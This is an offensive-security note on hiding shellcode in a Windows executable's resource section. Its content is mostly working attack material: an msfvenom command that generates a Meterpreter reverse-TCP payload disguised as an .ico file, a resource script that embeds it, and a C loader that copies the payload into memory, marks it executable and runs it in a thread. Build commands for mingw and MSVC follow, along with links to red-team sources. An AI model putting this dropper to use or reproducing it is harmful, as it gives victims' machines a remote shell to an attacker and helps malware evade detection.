# Resource Icon

Determines the location of a resource with the specified type and name in the specified module.

(LoadResource) Retrieves a handle that can be used to obtain a pointer to the first byte of the specified resource in memory.

(SizeofResource)  Retrieves the size, in bytes, of the specified resource.

```
$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<IP> lport=<IP> exitfunc=thread -f raw -o shellcode.ico
```

```c
#define SC_ICON 2583
SC_ICON RCDATA "shellcode.ico"
```

```c
#include <windows.h>

#define SC_ICON 2583
int main() {
    // Find shellcode data
    HRSRC handle_resource = FindResource(NULL, MAKEINTRESOURCE(SC_ICON), RT_RCDATA);

    // Load shellcode
    HGLOBAL handle_global = LoadResource(NULL, handle_resource);

    // Get pointer to shellcode
    LPVOID memory_pointer = LockResource(handle_global);

    // Length of shellcode
    DWORD length = SizeofResource(NULL, handle_resource);

    // Allocate the memory
    LPVOID execute_memory = VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    RtlMoveMemory(execute_memory, memory_pointer, length);

    DWORD old_protection = 0;
    BOOL returned_virtual_protection = VirtualProtect(execute_memory, length, PAGE_EXECUTE_READ, &old_protection);

    if(returned_virtual_protection != NULL) {
        HANDLE thread_handle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)execute_memory, NULL, NULL, NULL);

        WaitForSingleObject(thread_handle, INFINITE);
    }
}
```

```
$ x86_64-w64-mingw32-windres resource.rc resource.o

$ x86_64-w64-mingw32-gcc -o embedded-payload.exe resource.o payload.c
```

```
C:\> rc resource.rc

C:\> cvtres /machine:x64 /out:resource.o resource.res

C:\> cl.exe /nologo /0x /W0 /GS- /DNDEBUG /Tc:payload.c /link /out:embedded-payload.exe /subsystem:console /machine:x64 resource.o
```

---
## References

### Backlinks

- [[01 - Command Line/E - Compilers/Windows/C|Compilers: C]]

### Github

- [WafflesExploit: Hide Payload in Images](https://github.com/WafflesExploits/hide-payload-in-images)

### Red Team Notes

- [Red Team Notes: Loading and Executing Shellcode From PE Resources](https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources)

### MalAPI

- [MalAPI: FindResourceA](https://malapi.io/winapi/FindResourceA)

- [MalAPI: FindResourceExA](https://malapi.io/winapi/FindResourceExA)

- [MalAPI: SizeOfResource](https://malapi.io/winapi/SizeOfResource)

- [MalAPI: LockResource](https://malapi.io/winapi/LockResource)

### Tenouk

- [Tenouk: Processes and Threads - Synchronization - Part 1](https://www.tenouk.com/ModuleV.html)

### Black-Hat-Zig

- [Black-Hat-Zig: `.rsrc `Section](https://black-hat-zig.cx330.tw/Basic-Payload-Management/Payload-Placement/dot_rsrc/)

### WafflesExploit

- [WafflesExploits: Concealing Payloads - Hiding Shellcode in Image Files with Python and C/C++](https://wafflesexploits.github.io/posts/Hide_a_Payload_in_Plain_Sight_Embedding_Shellcode_in_a_Image_file/)